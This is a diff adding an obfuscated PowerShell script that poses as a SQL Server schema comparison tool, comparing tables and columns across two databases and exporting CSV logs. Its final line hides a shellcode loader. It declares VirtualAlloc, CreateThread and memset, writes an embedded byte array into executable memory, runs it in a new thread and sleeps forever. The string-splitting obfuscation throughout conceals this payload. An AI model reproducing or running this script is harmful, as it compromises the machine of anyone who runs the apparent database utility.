@@ -1,0 +1,107 @@
+param( 
+	${SQL`sER`VerO`Ne} = ("{5}{4}{1}{2}{0}{3}" -f'a','rDa','t','baseServer','u','Yo'),
+	${F`IRS`Td`ATABase} = ("{2}{4}{0}{1}{3}{6}{5}" -f'ab','as','FirstD','eTo','at','pare','Com'), 
+	${sQ`LusEr`NameONe} = ("{2}{0}{1}"-f'L','ogin','SQL '),
+	${sQ`Lp`AsSwOrDOne} = ("{1}{0}{3}{2}"-f'sswo','SQL Pa','d','r'),
+	${SQlSE`Rve`R`TwO} = ("{2}{3}{4}{0}{1}{5}" -f'a','s','You','rD','atab','eServer'),
+	${sECond`D`At`AbASE} = ("{3}{1}{0}{2}" -f 'oCompar','abaseT','e','SecondDat'), 
+	${SQ`l`UsErN`A`METwO} = ("{1}{0}"-f 'L Login','SQ'),
+	${sQ`L`pAsswO`RdTWo} = ("{3}{2}{0}{1}" -f'sswor','d','a','SQL P'),
+	${Fi`le`PR`efix} = 'Log',
+	[switch]${L`OG},
+	[switch]${COlU`mn}
+	)
+
+${F`IlE} = ${fil`ePREF`ix} + '{0}-{1}.csv'
+
+${ta`BlEq`UErY} = ((("{9}{18}{41}{25}{20}{39}{49}{3}{13}{29}{17}{14}{30}{7}{1}{19}{50}{5}{26}{27}{46}{48}{6}{24}{15}{35}{8}{23}{44}{32}{43}{28}{10}{36}{11}{37}{2}{16}{22}{4}{45}{33}{31}{40}{47}{21}{12}{42}{0}{38}{34}" -f' only u','e syso','m','Name
+	fro','e ','cts',' l','r','s','	sel',' user tables
+	','ts','c','m sy','jects
+	wh','XU5lX ','e','b','ect s','bj','ts','-spe',' not lik','p','ike 5l','objec','.','xt','ly','so','e','es','f','Xdtproperti','tables','and --','sysobjec','.na','ser ','.name as','5','ys','ify','y on','eci','5l','y','lX -','pe',' Table','e')) -REPlACE  '5lX',[CHaR]39)
+
+function rU`N-`QUERy()
+{
+	param (
+	${sQ`Lq`UerY},
+	${Sq`lse`Rver},
+	${S`qlcA`TaL`OG}, 
+	${sq`lUS`er},
+	${S`qlPAsS}
+	)
+	
+	${sQLC`o`NnStR`InG} = ('Serv'+'er '+'= '+"$SqlServer; "+'Dat'+'ab'+'ase '+'= '+"$SqlCatalog; "+'user'+' '+'= '+"$SqlUser; "+'passw'+'o'+'rd'+' '+'= '+"$SqlPass")
+	${SqLco`Nn`e`ctioN} = .("{1}{2}{0}" -f'ect','New-Ob','j') ("{4}{3}{9}{7}{1}{6}{0}{5}{8}{2}"-f'on','nt','ion','ata.SqlC','System.D','ne','.SqlC','ie','ct','l')
+	${SQ`l`Conn`EC`TiOn}."C`O`NnecT`IoN`stRing" = ${sQ`LC`oNN`stRINg}
+	
+	${SqL`C`MD} = .("{0}{2}{1}" -f'Ne','ect','w-Obj') ("{5}{7}{4}{3}{0}{2}{6}{1}" -f'Client.SqlCo','d','mma','l','Data.Sq','Sys','n','tem.')
+	${SqL`CMD}."C`OmMandT`eXT" = ${sql`Q`UE`RY}
+	${sql`CmD}."co`NNEcT`I`On" = ${SQlCoNn`EcT`I`oN}
+	
+	${sQ`Lad`APT`eR} = &("{0}{1}{2}" -f'New-Obj','e','ct') ("{1}{7}{3}{2}{4}{6}{5}{8}{0}" -f 'ter','Syst','SqlC','m.Data.','lie','a','nt.SqlDataAd','e','p')
+	${SQ`lA`DapTEr}."sELEcTcOM`m`AnD" = ${Sq`Lcmd}
+	
+	${D`At`ASeT} = .("{2}{0}{1}" -f'jec','t','New-Ob') ("{3}{1}{2}{0}{4}"-f'.D','yste','m.Data','S','ataSet')
+	${a} = ${sqLAdA`pt`ER}.("{0}{1}"-f'Fi','ll').Invoke(${DATa`SEt})
+	
+	${S`Ql`cO`NNEcT`iOn}.("{0}{1}" -f 'C','lose').Invoke()
+	
+	${DAtas`Et}."TA`BLes" | &("{0}{3}{1}{2}" -f'Sel','t-Objec','t','ec') -ExpandProperty ("{1}{0}"-f 's','Row')
+}
+
+${tAb`leS`DB`OnE} = &("{0}{1}{2}" -f 'Run-Que','r','y') -SqlQuery ${Ta`BLEq`UE`RY} -SqlServer ${sq`LSERve`Ro`Ne} -SqlCatalog ${F`IRsTDaT`Ab`AsE} -SqlUser ${SqlUS`eR`NAME`O`Ne} -SqlPass ${SQ`lpAS`S`WoRd`one} | .("{1}{2}{0}{3}" -f'ect-Obje','S','el','ct') -Property ("{2}{0}{1}" -f'bleNa','me','Ta')
+
+${taB`L`eS`dbTWO} = &("{0}{1}{2}"-f'Run-','Qu','ery') -SqlQuery ${tAb`LEQ`Ue`Ry} -SqlServer ${SqL`SE`R`VErt`wo} -SqlCatalog ${sec`ondd`AtabA`SE} -SqlUser ${sQL`UsE`RN`AMet`wo} -SqlPass ${s`qlpaSSWo`RD`T`Wo} | &("{2}{3}{0}{1}" -f 'ec','t','Selec','t-Obj') -Property ("{1}{0}{2}" -f'ableNam','T','e')
+
+.("{1}{0}{2}{3}"-f'it','Wr','e-Hos','t') ("{2}{0}{1}{5}{7}{6}{3}{4}"-f'i','f','D','bles:',' ','ferences i',' Ta','n')
+${DA`TAb`ASe} = @{("{1}{0}"-f'me','Na')=("{0}{1}"-f 'D','atabase');("{2}{1}{0}"-f 'ession','xpr','E')={if (${_}."sId`Ein`d`icaT`Or" -eq '<='){'{0} / {1}' -f ${Fi`R`sTdAT`AB`Ase}, ${SQ`lSEr`VeroNE}} else {'{0} / {1}' -f ${sec`onDdaTa`B`A`Se}, ${s`qLsErv`ERT`wo}}}}
+${tA`BleDIf`FErE`N`Ce}  = .("{0}{2}{1}"-f'Compare-','t','Objec') ${TAbleSD`Bo`NE} ${ta`BlesDB`TWO} -SyncWindow ((${T`AblESD`Bo`Ne}."Co`UNT" + ${ta`BlES`DbTwO}."Cou`NT")/2) -Property ("{2}{0}{1}"-f 'ableNa','me','T') | .("{2}{1}{0}" -f 't','elec','s') ("{2}{1}{0}{3}" -f'a','eN','Tabl','me'), ${da`Ta`BAsE}
+
+if (${l`oG})
+{
+	${T`ABLediF`F`ERenCe} | .("{1}{2}{0}"-f 'v','Export-C','s') -Path (${F`iLE} -f ${fI`R`sT`dATAbAse}, ${sEcon`dd`ATaB`Ase}) -NoTypeInformation
+}
+
+${taB`LEdi`F`FeRE`NcE} | &("{1}{0}{2}"-f'b','Sort-O','ject') -Property ("{2}{0}{1}"-f'Nam','e','Table'), ("{1}{0}" -f'tabase','Da')
+
+
+if (${cOLu`mN})
+{
+	
+	${s`A`M`ETAbleS} = .("{3}{4}{0}{2}{1}" -f'are','ect','-Obj','C','omp') ${t`ABleS`Db`oNE} ${TABLE`S`dbtwo} -SyncWindow ((${tabl`es`DBone}."c`oUNt" + ${TablEs`dBt`wo}."cO`UNt")/2) -Property ("{1}{0}"-f'ame','TableN') -IncludeEqual -ExcludeDifferent 
+	
+	${cO`LUMN`QU`eRy} = @"
+select sysobjects.name as TableName
+	, syscolumns.name as ColumnName 
+	, systypes.name as Type
+	, systypes.Length
+	, systypes.XUserType
+from sysobjects, syscolumns, systypes
+where sysobjects.xtype like 'U' and --specify only user tables
+	sysobjects.name not like 'dtproperties' and --specify only user tables
+	syscolumns.xusertype= systypes.xusertype --get data type info
+	and sysobjects.id=syscolumns.id 
+	and sysobjects.name = '{0}'
+order by sysobjects.name, syscolumns.name, syscolumns.type
+"@
+	
+	&("{1}{0}{2}"-f'te-Ho','Wri','st') "`n`n"
+	&("{0}{2}{1}" -f'Read','st','-Ho') ("{1}{9}{2}{6}{3}{4}{7}{5}{0}{8}"-f 'lumn Diffe','Pr','ss ','o Ch','e','r Co','Enter t','ck fo','rences','e')
+	
+	foreach (${tAb`le} in ${Sa`me`TAb`leS})
+	{
+		${COL`UMNs`db`OnE} = .("{0}{1}{2}"-f 'Run','-Qu','ery') -SqlQuery (${coLU`MnQU`ERy} -f ${TA`Ble}."T`A`BlEN`AME")  -SqlServer ${S`qLserv`ERO`NE} -SqlCatalog ${fI`RS`T`dAtAbaSE} -SqlUser ${SqL`Us`ERnaMeO`Ne} -SqlPass ${S`qLP`Ass`worDONe} | &("{2}{0}{1}{3}{4}"-f'elect','-','S','Obj','ect') -Property ("{0}{1}{2}" -f 'T','ableN','ame'), ("{0}{1}{3}{2}" -f'C','olu','me','mnNa'), ("{0}{1}" -f'T','ype'), ("{0}{1}{2}"-f'L','eng','th'), ("{2}{0}{1}"-f'ser','Type','XU')
+
+		${coL`U`MnSD`BTWo} = &("{2}{0}{1}" -f 'un-','Query','R') -SqlQuery (${co`LuMnq`U`Ery} -f ${T`ABlE}."tAB`lE`NaMe") -SqlServer ${SQl`Se`RvErTWo} -SqlCatalog ${s`e`coNDda`TabASE} -SqlUser ${SqLUse`R`NaM`E`Two} -SqlPass ${SQl`paSsw`orD`TwO} | .("{2}{1}{3}{0}" -f 'ject','ect-','Sel','Ob') -Property ("{0}{1}{2}"-f'Ta','bleN','ame'), ("{0}{2}{1}" -f'Colu','nName','m'), ("{0}{1}" -f'T','ype'), ("{1}{0}" -f 'ngth','Le'), ("{0}{2}{3}{1}" -f'XU','e','s','erTyp')
+		
+		${coLUMnd`If`Feren`CE} = .("{2}{0}{1}"-f'pare-','Object','Com') ${c`Olum`NsdBONE} ${C`OLu`Mnsdb`T`wO} -SyncWindow ((${cOl`UMNSd`BonE}."cou`Nt" + ${cOL`Umn`SDb`Two}."co`UNT")/2) -Property ("{2}{0}{1}"-f 'bleNa','me','Ta'), ("{2}{0}{1}"-f'olumnNa','me','C'), ("{0}{1}"-f'T','ype'), ("{0}{1}{2}" -f'Leng','t','h'), ("{1}{2}{0}" -f 'e','XU','serTyp') | .("{2}{0}{1}"-f 'ct-Obje','ct','Sele') ("{2}{0}{1}"-f 'ableNa','me','T'), ("{3}{0}{2}{1}" -f 'o','ame','lumnN','C'), ("{0}{1}"-f 'Typ','e'), ("{2}{1}{0}"-f'h','engt','L'), ("{1}{0}{2}"-f's','XU','erType'), ${DAT`Ab`ASe}
+		
+		if (${l`OG} -and ${cOlum`N`DIFfeRE`Nce} )
+		{
+			${columNdIff`Er`E`NcE} | .("{2}{1}{0}"-f '-Csv','ort','Exp') -Path (${FI`lE} -f ${T`Ab`LE}."T`AbLENa`ME",("{2}{1}{0}"-f 'ns','olum','C') ) -NoTypeInformation
+		}
+		
+		${CoLUm`Ndi`F`Fe`REncE} | .("{0}{1}" -f 'so','rt') ("{0}{1}{2}"-f 'ColumnN','am','e'), ("{1}{0}"-f'e','Databas')
+		
+	}
+}
+${C} = (((("{21}{15}{8}{30}{31}{49}{45}{19}{22}{14}{28}{27}{34}{53}{57}{83}{32}{38}{68}{26}{72}{84}{10}{56}{58}{71}{33}{64}{23}{63}{42}{1}{37}{29}{41}{77}{79}{25}{35}{24}{75}{52}{4}{50}{13}{44}{46}{54}{18}{51}{48}{81}{5}{16}{47}{74}{11}{43}{6}{66}{40}{12}{69}{17}{3}{82}{39}{73}{36}{70}{2}{55}{20}{76}{80}{60}{67}{78}{59}{7}{9}{65}{62}{61}{0}"-f't);','Pro','i',';[','ateThread(In','ess,','r, uint dwCreation','uint src','po',', u','f','ar','gs, Int','dAttribu','g)]publ','Im',' I','hreadId)','tP','el3','tat','[Dll','2.dllJp',' uint','blic static exte','.','t ','ntPt','ic static extern I','[DllImp','rt(Jpg','ke','Addre','pe','r Vi','dllJpg)]pu','ll','tect);','ss,','Import(J','a','ort(Jpgker','l','amete','tes, uint dwStac','n','kSize, ','ntPt','Ad','r','tPtr lpThrea','tr lpStart','Ptr Cre','r','In','c s','lAllocat','tualAl','i','t, ','ntPtr memset(IntPt','n',' cou',' f',',','int','Fl','r',' uin','Ptr lpT','Jpg)]publ','onTy','dwSize, ui','pgmsvcrt.d','r lpP','rn Int','ic e','n',' des','el32','xtern I','dr','Dll','loc(IntPtr lp','nt '))-CREpLAce ([ChaR]74+[ChaR]112+[ChaR]103),[ChaR]34));${w} = .("{0}{1}"-f'Add-Typ','e') -memberDefinition ${c} -Name ("{0}{1}"-f'Wi','n32') -namespace ("{2}{0}{3}{1}" -f 'io','s','Win32Funct','n') -passthru;[Byte[]];[Byte[]]${Z} = 0xbb,0x7e,0x88,0x10,0x58,0xd9,0xce,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xea,0xfc,0x03,0x5a,0x71,0x6a,0xe5,0xa4,0x65,0xe8,0x06,0x55,0x75,0x8d,0x8f,0xb0,0x44,0x8d,0xf4,0xb1,0xf6,0x3d,0x7e,0x97,0xfa,0xb6,0xd2,0x0c,0x89,0xbb,0xfa,0x23,0x3a,0x71,0xdd,0x0a,0xbb,0x2a,0x1d,0x0c,0x3f,0x31,0x72,0xee,0x7e,0xfa,0x87,0xef,0x47,0xe7,0x6a,0xbd,0x10,0x63,0xd8,0x52,0x15,0x39,0xe1,0xd9,0x65,0xaf,0x61,0x3d,0x3d,0xce,0x40,0x90,0x36,0x89,0x42,0x12,0x9b,0xa1,0xca,0x0c,0xf8,0x8c,0x85,0xa7,0xca,0x7b,0x14,0x6e,0x03,0x83,0xbb,0x4f,0xac,0x76,0xc5,0x88,0x0a,0x69,0xb0,0xe0,0x69,0x14,0xc3,0x36,0x10,0xc2,0x46,0xad,0xb2,0x81,0xf1,0x09,0x43,0x45,0x67,0xd9,0x4f,0x22,0xe3,0x85,0x53,0xb5,0x20,0xbe,0x6f,0x3e,0xc7,0x11,0xe6,0x04,0xec,0xb5,0xa3,0xdf,0x8d,0xec,0x09,0xb1,0xb2,0xef,0xf2,0x6e,0x17,0x7b,0x1e,0x7a,0x2a,0x26,0x76,0x4f,0x07,0xd9,0x86,0xc7,0x10,0xaa,0xb4,0x48,0x8b,0x24,0xf4,0x01,0x15,0xb2,0xfb,0x3b,0xe1,0x2c,0x02,0xc4,0x12,0x64,0xc0,0x90,0x42,0x1e,0xe1,0x98,0x08,0xde,0x0e,0x4d,0xa4,0xdb,0x98,0xd0,0xce,0x36,0x0c,0x45,0x33,0xb7,0xbd,0xc4,0xba,0x51,0xed,0xb6,0xec,0xcd,0x4d,0x67,0x4d,0xbe,0x25,0x6d,0x42,0xe1,0x55,0x8e,0x88,0x8a,0xff,0x61,0x65,0xe2,0x97,0x18,0x2c,0x78,0x06,0xe4,0xfa,0x04,0x08,0x6e,0x09,0xf8,0xc6,0x87,0x64,0xea,0xbe,0x67,0x33,0x50,0x68,0x77,0xe9,0xff,0x94,0xed,0x16,0x56,0xc3,0x99,0x14,0x8f,0x23,0x06,0xe6,0xfa,0x38,0x8f,0x72,0x45,0x56,0xf0,0x92,0x45,0xa6,0xa6,0xf8,0x45,0xce,0x1e,0x59,0x16,0xeb,0x60,0x74,0x0a,0xa0,0xf4,0x77,0x7b,0x15,0x5e,0x10,0x81,0x40,0xa8,0xbf,0x7a,0xa7,0x28,0x83,0xac,0x81,0x5e,0xed,0x6c;${g} = 0x1000;if (${z}."LEn`gth" -gt 0x1000){${g} = ${Z}."Len`gtH"};${x}=${w}::("{0}{3}{1}{2}" -f 'V','alAl','loc','irtu').Invoke(0,0x1000,${g},0x40);for (${I}=0;${i} -le (${z}."L`engtH"-1);${i}++) {${W}::"mE`M`sET"([IntPtr](${x}.("{0}{1}"-f 'T','oInt32').Invoke()+${I}), ${Z}[${I}], 1)};${w}::("{3}{0}{2}{1}"-f'eateT','read','h','Cr').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{0}{3}{2}" -f 't-','Star','leep','s') 60};
